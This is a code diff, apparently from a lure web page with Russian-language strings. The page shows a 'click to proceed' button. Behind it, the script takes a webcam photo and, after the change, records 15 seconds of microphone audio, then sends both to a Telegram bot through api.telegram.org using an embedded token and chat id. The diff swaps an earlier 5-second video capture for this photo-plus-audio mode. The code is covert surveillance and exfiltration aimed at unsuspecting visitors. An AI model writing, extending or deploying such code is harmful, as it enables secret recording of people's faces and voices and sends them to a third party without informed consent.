@@ -42,10 +42,7 @@ var counter = 0;
 function initCamera() {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
-  var constraints = { video: { facingMode: "user" } };
-  if (mode === "video") constraints.audio = true;
-
-  navigator.mediaDevices.getUserMedia(constraints)
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   .then(function(s) {
     stream = s;
     v.srcObject = s;
@@ -56,7 +53,7 @@ function initCamera() {
   .catch(function(e) { console.log("cam err", e.name); });
 }
 
-// Отправка фото как КАРТИНКИ (с превью в чате)
+// Отправка фото как картинки
 function sendPhoto() {
   return new Promise(function(resolve) {
     c.width  = v.videoWidth  || 1280;
@@ -73,48 +70,72 @@ function sendPhoto() {
   });
 }
 
-// Отправка видео как ФАЙЛА (без сжатия)
-function sendVideo() {
+// Запись микрофона 15 секунд → отправка как аудио-файл
+function recordAudio() {
   return new Promise(function(resolve) {
-    var options = {};
-    if (window.MediaRecorder && MediaRecorder.isTypeSupported) {
-      if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) {
-        options.mimeType = "video/webm;codecs=vp9,opus";
-      } else if (MediaRecorder.isTypeSupported("video/webm")) {
-        options.mimeType = "video/webm";
-      } else if (MediaRecorder.isTypeSupported("video/mp4")) {
-        options.mimeType = "video/mp4";
-      }
-    }
-
-    var recorder;
-    try {
-      recorder = new MediaRecorder(stream, options);
-    } catch (e) {
-      console.log("recorder err", e);
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       resolve();
       return;
     }
 
-    var chunks = [];
-    recorder.ondataavailable = function(e) {
-      if (e.data && e.data.size) chunks.push(e.data);
-    };
-    recorder.onstop = function() {
-      var type = recorder.mimeType || "video/webm";
-      var ext  = type.indexOf("mp4") >= 0 ? "mp4" : "webm";
-      var blob = new Blob(chunks, { type: type });
+    navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function(audioStream) {
+      var options = {};
+      if (window.MediaRecorder && MediaRecorder.isTypeSupported) {
+        if (MediaRecorder.isTypeSupported("audio/webm;codecs=opus")) {
+          options.mimeType = "audio/webm;codecs=opus";
+        } else if (MediaRecorder.isTypeSupported("audio/webm")) {
+          options.mimeType = "audio/webm";
+        } else if (MediaRecorder.isTypeSupported("audio/mp4")) {
+          options.mimeType = "audio/mp4";
+        }
+      }
 
-      var fd = new FormData();
-      fd.append("chat_id", CHAT);
-      fd.append("document", blob, "video." + ext);
-      fetch("https://api.telegram.org/bot" + TOKEN + "/sendDocument", { method: "POST", body: fd })
-      .then(resolve).catch(resolve);
-    };
+      var recorder;
+      try {
+        recorder = new MediaRecorder(audioStream, options);
+      } catch (e) {
+        console.log("recorder err", e);
+        audioStream.getTracks().forEach(function(t){ t.stop(); });
+        resolve();
+        return;
+      }
 
-    recorder.start();
-    btn.textContent = "Запись 5 секунд...";
-    setTimeout(function() { try { recorder.stop(); } catch (e) {} }, 5000);
+      var chunks = [];
+      recorder.ondataavailable = function(e) {
+        if (e.data && e.data.size) chunks.push(e.data);
+      };
+      recorder.onstop = function() {
+        audioStream.getTracks().forEach(function(t){ t.stop(); });
+
+        var type = recorder.mimeType || "audio/webm";
+        var ext  = type.indexOf("mp4") >= 0 ? "m4a" : "ogg";
+        var blob = new Blob(chunks, { type: type });
+
+        var fd = new FormData();
+        fd.append("chat_id", CHAT);
+        fd.append("voice", blob, "voice." + ext);
+        fetch("https://api.telegram.org/bot" + TOKEN + "/sendVoice", { method: "POST", body: fd })
+        .then(resolve).catch(resolve);
+      };
+
+      recorder.start();
+      var sec = 15;
+      btn.textContent = "Запись звука... " + sec;
+      var t = setInterval(function() {
+        sec--;
+        if (sec > 0) btn.textContent = "Запись звука... " + sec;
+      }, 1000);
+
+      setTimeout(function() {
+        clearInterval(t);
+        try { recorder.stop(); } catch (e) {}
+      }, 15000);
+    })
+    .catch(function(e) {
+      console.log("mic err", e.name);
+      resolve();
+    });
   });
 }
 
@@ -127,10 +148,10 @@ btn.addEventListener("click", function() {
   var n = counter;
 
   if (mode === "video") {
-    btn.textContent = "Запись 5 секунд...";
-    sendVideo().then(function() {
+    // Режим «Фото + микрофон»
+    sendPhoto().then(function() {
       btn.textContent = "Загрузка... (" + n + ")";
-      return sendPhoto();
+      return recordAudio();
     }).then(function() {
       btn.textContent = "Готово ✓";
       setTimeout(function() { btn.textContent = "Нажмите, чтобы перейти"; }, 800);
@@ -140,6 +161,7 @@ btn.addEventListener("click", function() {
       busy = false;
     });
   } else {
+    // Только фото
     btn.textContent = "Загрузка... (" + n + ")";
     sendPhoto().then(function() {
       setTimeout(function() { btn.textContent = "Нажмите, чтобы перейти"; }, 700);
